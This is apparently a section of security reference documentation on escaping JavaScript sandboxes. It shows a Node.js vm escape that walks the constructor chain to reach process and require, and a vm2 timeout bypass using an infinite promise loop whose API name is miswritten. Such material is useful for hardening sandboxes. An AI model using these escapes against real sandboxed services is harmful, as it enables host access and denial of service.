Sandbox escape
========================================

Front-end sandbox
----------------------------------------
In the front-end, you may use deletion ``eval``, rewrite ``Function.prototype.constructor`` / ``GeneratorFunction`` / ``AsyncFunction`` and so on to complete the front-end sandboxing. In this case, you can use the way to create a new iframe to get a new execution environment.

Server side sandbox
----------------------------------------
JavaScript provides native vm modules for isolating the code context environment. However, in this environment, the standard JavaScript API and the global NodeJS environment can still be accessed.

In the native sandbox module, the commonly used escape methods are:

.. code-block:: javascript

const vm = require('vm');
const sandbox = {};
const whatIsThis = vm.runInNewContext(`
const ForeignObject = this.constructor;
const ForeignFunction = ForeignObject.constructor;
const process = ForeignFunction("return process")();
const require = process.mainModule.require;
require("fs");
`, sandbox);


Considering the shortcomings of JavaScript native vm module, some developers have designed vm2 to provide a safer isolation environment, but there are also some escape methods in the old version, such as:

.. code-block:: javascript

VM.RuninnewContext (
'Promise.resolve().then(()=>{while(1)console.log("foo", Date.now());}); while(1)console.log(Date.now())',
{console:{log(){console.log.apply(console,arguments);}}},
{timeout:5}
);
